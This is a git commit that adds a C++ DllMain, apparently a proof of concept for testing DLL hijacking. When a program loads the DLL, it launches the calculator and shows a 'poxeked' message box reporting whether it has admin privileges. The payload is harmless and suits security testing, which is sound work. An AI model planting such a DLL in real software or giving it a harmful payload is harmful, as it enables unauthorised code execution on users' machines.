b371d7d8e8d7bf51f19635e41a7f51110df793d1
Dmitry <29678249+ZemlyakovDmitry@users.noreply.github.com>
2022-05-07 21:01:01 +0300

    Add files via upload

---
+++ dll-hijack/dllmain.cpp
@@ -0,0 +1,28 @@
+﻿// dllmain.cpp : Определяет точку входа для приложения DLL.
+#include "pch.h"
+#include <windows.h>
+#include <shlobj.h>
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        system("start calc");
+        if (IsUserAnAdmin()) {
+            MessageBoxA(NULL, "poxeked, i have admin privileges", "poxek", MB_ICONWARNING);
+        }
+        else {
+            MessageBoxA(NULL, "poxeked, but i don\'t have admin privileges", "poxek", MB_ICONERROR);
+        }
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
